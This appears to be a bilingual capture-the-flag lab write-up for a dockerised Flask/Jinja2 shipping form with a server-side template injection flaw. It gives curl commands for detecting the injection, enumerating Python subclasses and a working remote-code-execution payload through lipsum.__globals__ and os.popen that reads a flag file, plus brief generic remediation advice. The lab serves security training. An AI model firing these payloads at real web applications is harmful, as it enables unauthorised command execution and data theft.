# WEB-12: SSTI Jinja2 Template Injection

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-12 |
| 名称 | SSTI Jinja2 Template Injection |
| 技术/CVE | N/A (SSTI vulnerability) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10112 |

## 场景概述
- 技术：N/A (SSTI vulnerability)
- 难度：L2
- 交付方式：docker
- 入口端口：10112
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | SSTI (Server-Side Template Injection) |
| Difficulty | L2 |
| Port | 10112 |
| Path | scenarios/web/ssti-jinja2/ |
| Type | docker |
| Service | Shipping Request Form |

### Attack Path Summary
```
User submits form → name parameter injected into Jinja2 Template() constructor → SSTI → RCE → Read flag
```

### Prerequisites

#### Knowledge
- Jinja2模板引擎SSTI (Jinja2 template engine SSTI): Understanding how Jinja2 evaluates template expressions during rendering
- Python MRO (Method Resolution Order): Traversing Python class hierarchies for object exploitation
- 沙箱逃逸 (Sandbox escape): Techniques to break out of restricted Python execution environments

#### Tools
- curl: Send HTTP POST requests with crafted SSTI payloads
- Python3: Test and construct RCE payloads for verification

### Step-by-Step Exploitation

#### Step 1: Access the Shipping Request Form

Open the service in a browser or via curl to view the form.

```bash
curl http://localhost:10112/
```

#### Step 2: Test SSTI Detection

Submit a mathematical expression wrapped in Jinja2 template syntax to confirm SSTI vulnerability.

```bash
curl -X POST http://localhost:10112/submit -d "name={{7*7}}"
```

Expected response contains "Thank you 49" — the expression `7*7` was evaluated server-side to `49`.

#### Step 3: Enumerate Available Classes

List all available Python subclasses to identify exploitable objects for RCE.

```bash
curl -X POST http://localhost:10112/submit -d "name={{''.__class__.__mro__[1].__subclasses__()}}"
```

#### Step 4: Execute RCE to Read the Flag

Use `lipsum` (a globally available Jinja2 object) to access `os.popen` and read the flag file.

```bash
curl -X POST http://localhost:10112/submit -d "name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}"
```

### Flag Location
- `/FLAG.txt` in the application container

### Verification Commands
```bash
curl -s -X POST http://localhost:10112/submit -d "name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}" | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Flask/Jinja2 rendering endpoint |
| 侦察与前置条件 | Template interpolation sink and available object graph discovery |
| 核心漏洞与利用 | Construct a Jinja2 SSTI payload |
| 权限、横向或影响 | Python process command execution |
| 验证 | Render a payload that reads the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
